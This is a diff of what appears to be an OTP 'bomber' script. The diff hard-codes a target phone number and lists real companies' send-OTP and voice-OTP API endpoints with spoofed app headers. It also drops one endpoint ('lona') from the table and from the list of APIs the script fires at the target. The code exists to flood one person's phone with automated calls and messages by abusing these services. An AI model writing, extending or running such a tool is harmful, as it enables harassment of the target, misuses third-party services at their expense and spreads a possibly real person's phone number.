@@ -1,3 +1,4 @@
+target = 9876448998
 # Credits to Ansh Dadwal
 target = str(target)
 true = "true"
@@ -25,12 +26,10 @@ apidata = {
 
 "zepto":("https://api.zepto.co.in/api/v1/user/customer/send-otp-ivr/",'{"mobileNumber":'+f'"{target}"'+'}',{'Host': 'api.zepto.co.in', 'accept': 'application/json', 'access-control-allow-credentials': 'true', 'x-requested-with': 'XMLHttpRequest', 'requestid': '006b9aed-23c6-4640-bb57-66070b258286', 'sessionid': 'undefined', 'appversion': '5.12.1', 'platform': 'android', 'systemversion': '10', 'source': 'PLAY_STORE', 'Content-Type': 'application/json', 'content-length': '29', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.12.12'},"POST","OTP"),
 
-"gold":("https://api.crofarm.com/cons/consumer/otp/v1/",'{"phone":"'+target+'","is_voice_otp":1}',{},"POST",'success":true'),
-
-"lona":(f"https://www.loanbaba.com/sdgpeknj/MAppService.asmx/SendOTPonCall",{"phoneNo":f"str(target)"},{"Content-Type":"application/json"},"POST","success")
-
+"gold":("https://api.crofarm.com/cons/consumer/otp/v1/",'{"phone":"'+target+'","is_voice_otp":1}',{},"POST",'success":true')
 
 }
+
 
 
 apis = [
@@ -45,6 +44,5 @@ apidata["gold"],
 apidata["idn"],
 apidata["bikry"],
 apidata ["kingotp"],
-apidata ["zepto"],
-apidata["lona"]
+apidata ["zepto"]
 ]
